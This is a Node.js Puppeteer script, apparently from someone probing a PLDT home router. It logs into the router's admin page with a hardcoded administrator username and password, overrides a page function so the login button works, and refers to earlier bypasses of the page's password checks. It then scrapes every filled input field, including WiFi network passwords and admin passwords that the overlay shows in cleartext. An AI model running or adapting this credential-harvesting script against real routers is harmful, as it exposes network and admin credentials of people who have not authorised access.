#!/usr/bin/env node
/**
 * Login WITHOUT bypasses to trigger PLDT2 overlay.
 * The overlay pre-fills WiFi passwords in cleartext.
 */
const puppeteer = require('puppeteer');

(async () => {
  const b = await puppeteer.launch({headless:false, ignoreHTTPSErrors:true, args:['--no-sandbox','--ignore-certificate-errors','--window-size=1280,720']});
  const [p] = await b.pages();

  // Login WITHOUT any JS overrides — let PLDT2 overlay appear
  console.log('Navigating to login...');
  await p.goto('https://192.168.1.1/admin.html', {waitUntil:'domcontentloaded', ignoreHTTPSErrors:true, timeout:15000});
  await new Promise(r => setTimeout(r,2000));

  // Do NOT set preflag=0. Do NOT override CheckPassword.
  // Only override setDisable so the button works
  console.log('Setting minimal bypasses...');
  await p.evaluate(() => {
    window.setDisable = () => {};
  });

  // Type credentials
  console.log('Typing credentials...');
  await p.type('input#txt_Username', 'adminpldt', {delay:30});
  await p.type('input#txt_Password', 'AC2DIU7QW3ERTY6UPAS4DFG', {delay:20});

  // Click login
  console.log('Clicking login...');
  await p.click('button#button');
  await new Promise(r => setTimeout(r,6000));

  console.log('URL after login:', p.url());

  // Check the page state
  const state = await p.evaluate(() => {
    const r = {};
    r.overlay = document.getElementById('pwd_modify') ? {
      display: document.getElementById('pwd_modify').style.display,
      html: document.getElementById('pwd_modify').innerHTML.substring(0, 500),
    } : null;

    // ALL input fields on the page
    r.allInputs = {};
    document.querySelectorAll('input').forEach(el => {
      if (el.value) r.allInputs[el.id || el.name] = el.value;
    });

    // Check for WiFi-related fields specifically
    r.ssidFields = {};
    ['ssid1_name','ssid2_name','ssid1_password','ssid2_password',
     'ssid1_confirm_password','ssid2_confirm_password',
     'old_password','new_password','confirm_password'].forEach(id => {
      const el = document.getElementById(id);
      if (el) r.ssidFields[id] = { value: el.value, type: el.type, display: el.style.display };
    });

    r.preflag = typeof window.preflag !== 'undefined' ? window.preflag : 'undefined';
    r.CfgMode = typeof window.CfgMode !== 'undefined' ? window.CfgMode : 'undefined';

    return r;
  });
  console.log('State:', JSON.stringify(state, null, 2));

  // Keep browser open
  await new Promise(() => {});
})().catch(e => { console.error(e); process.exit(1); });
